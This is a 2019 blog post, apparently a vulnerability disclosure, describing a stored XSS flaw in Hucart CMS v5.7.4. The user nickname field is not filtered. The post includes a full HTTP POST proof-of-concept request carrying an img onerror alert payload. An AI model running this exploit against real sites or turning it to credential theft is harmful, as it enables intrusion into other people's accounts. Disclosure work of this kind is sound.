=== Content from www.cnblogs.com_21ecec4a_20250119_115035.html ===


[![](https://img2024.cnblogs.com/blog/35695/202412/35695-20241201073014811-1847930772.jpg)](https://www.doubao.com?channel=cnblogs&source=hw_db_cnblogs)

* [![博客园Logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [周边](https://cnblogs.vip/store)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/18341478)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)
  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)
  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  简洁模式 ![](/images/lite-mode-check.svg)...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/echod/)
# [echo\_d](https://www.cnblogs.com/echod)

## 岁月不饶人 我亦未曾饶过岁月

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/echod/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/echo_d)
* 订阅
* [管理](https://i.cnblogs.com/)

# [Hucart cms v5.7.4 XSS Vulnerability analysis](https://www.cnblogs.com/echod/articles/10380909.html "发布于 2019-02-14 21:41")

code analysis

![](https://img2018.cnblogs.com/blog/1252000/201902/1252000-20190214213652992-1064911496.png)

![](https://img2018.cnblogs.com/blog/1252000/201902/1252000-20190214213704301-1837122082.png)

Updating user information, data submitted by users and not filtering dangerous characters result in XSS storage vulnerabilities

After sending EXP, browsing user information triggers XSS vulnerability

![](https://img2018.cnblogs.com/blog/1252000/201902/1252000-20190214214038269-1576849405.png)

POC

First register an account

<http://127.0.0.1/hucart/user/index.php?load=login&act=reg>

Then log in.

Exp Packets are provided here

Insert XSS payload at nickname

Triggered while browsing user's basic information

http://127.0.0.1/hucart/user/index.php?load=login&act=reg

POST /hucart/user/index.php?load=user\_info&act=update\_user HTTP/1.1

Host: 192.168.0.110

Content-Length: 1541

Cache-Control: max-age=0

Origin: http://192.168.0.110

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36

Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygIVXHhUwlupAJTnM

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8

Referer: http://192.168.0.110/hucart/user/?load=user\_info&act=info\_list

Accept-Language: zh-CN,zh;q=0.9

Cookie: PHPSESSID=k2mlv9rtdavtioa98nqajithm5; bdshare\_firstime=1550149965528; ck\_num=79385312dbee4c9e7270b26e4b3e1459

Connection: close

------WebKitFormBoundarygIVXHhUwlupAJTnM

Content-Disposition: form-data; name="usd\_nick"

"><img src=# onerror=alert(1)>

------WebKitFormBoundarygIVXHhUwlupAJTnM

Content-Disposition: form-data; name="usd\_image"

------WebKitFormBoundarygIVXHhUwlupAJTnM

Content-Disposition: form-data; name="usd\_truename"

------WebKitFormBoundarygIVXHhUwlupAJTnM

Content-Disposition: form-data; name="usd\_birthday"

------WebKitFormBoundarygIVXHhUwlupAJTnM

Content-Disposition: form-data; name="usd\_salt"

0

------WebKitFormBoundarygIVXHhUwlupAJTnM

Content-Disposition: form-data; name="usd\_msn"

admin

------WebKitFormBoundarygIVXHhUwlupAJTnM

Content-Disposition: form-data; name="usd\_qq"

123123

------WebKitFormBoundarygIVXHhUwlupAJTnM

Content-Disposition: form-data; name="usd\_officephone"

------WebKitFormBoundarygIVXHhUwlupAJTnM

Content-Disposition: form-data; name="usd\_homephone"

------WebKitFormBoundarygIVXHhUwlupAJTnM

Content-Disposition: form-data; name="usd\_tel"

123123

------WebKitFormBoundarygIVXHhUwlupAJTnM

Content-Disposition: form-data; name="province"

------WebKitFormBoundarygIVXHhUwlupAJTnM

Content-Disposition: form-data; name="city"

------WebKitFormBoundarygIVXHhUwlupAJTnM

Content-Disposition: form-data; name="district"

------WebKitFormBoundarygIVXHhUwlupAJTnM

Content-Disposition: form-data; name="pcd\_all"

------WebKitFormBoundarygIVXHhUwlupAJTnM

Content-Disposition: form-data; name="usd\_address"

------WebKitFormBoundarygIVXHhUwlupAJTnM--

posted @
2019-02-14 21:41
[echo\_d](https://www.cnblogs.com/echod)
阅读(339)
评论(0)
[编辑](https://i.cnblogs.com/EditArticles.aspx?postid=10380909)
收藏
举报

刷新页面[返回顶部](#top)

[![](https://img2024.cnblogs.com/blog/35695/202412/35695-20241201072501456-2052907165.jpg)](https://www.doubao.com?channel=cnblogs&source=hw_db_cnblogs)

### 公告

Copyright © 2025 echo\_d

Powered by .NET 9.0 on Kubernetes


